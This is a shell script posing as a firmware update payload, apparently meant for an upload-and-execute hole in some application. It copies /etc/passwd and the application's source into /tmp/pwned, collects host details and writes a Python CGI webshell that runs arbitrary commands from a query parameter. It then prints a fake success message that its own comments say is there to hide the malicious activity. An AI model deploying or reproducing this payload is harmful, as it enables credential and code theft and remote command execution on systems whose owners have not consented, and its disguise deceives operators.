#!/bin/sh
# Minimal firmware payload that doesn't rely on external tools

# Print a message to show the script was executed
echo "Firmware update started..."

# Create a directory for our files
mkdir -p /tmp/pwned 2>/dev/null

# Store basic system information
echo "==== System Information ====" > /tmp/pwned/sysinfo.txt
echo "Date: $(date 2>/dev/null)" >> /tmp/pwned/sysinfo.txt
echo "Hostname: $(hostname 2>/dev/null)" >> /tmp/pwned/sysinfo.txt
echo "Current user: $(whoami 2>/dev/null)" >> /tmp/pwned/sysinfo.txt

# Copy sensitive files
cat /etc/passwd > /tmp/pwned/passwd.txt 2>/dev/null
cat /app/app.py > /tmp/pwned/app.py.txt 2>/dev/null

# Create a simple webshell (if Python is available)
cat > /tmp/pwned/webshell.py << 'EOF'
import os
import sys

# This will be available at the endpoint /tmp/pwned/webshell.py
# Usage: ?cmd=whoami

cmd = os.environ.get('QUERY_STRING', '').split('=')[1] if '=' in os.environ.get('QUERY_STRING', '') else ''
if cmd:
    print("Content-type: text/plain\n")
    print(os.popen(cmd).read())
else:
    print("Content-type: text/plain\n")
    print("Ready for commands. Use ?cmd=your_command")
EOF

# Make our files accessible
chmod -R 755 /tmp/pwned 2>/dev/null

# Display "success" message to hide malicious activity
echo "Firmware update completed successfully"

# Print any parameters (for debugging)
echo "Parameters: $@"

# Exit with success
exit 0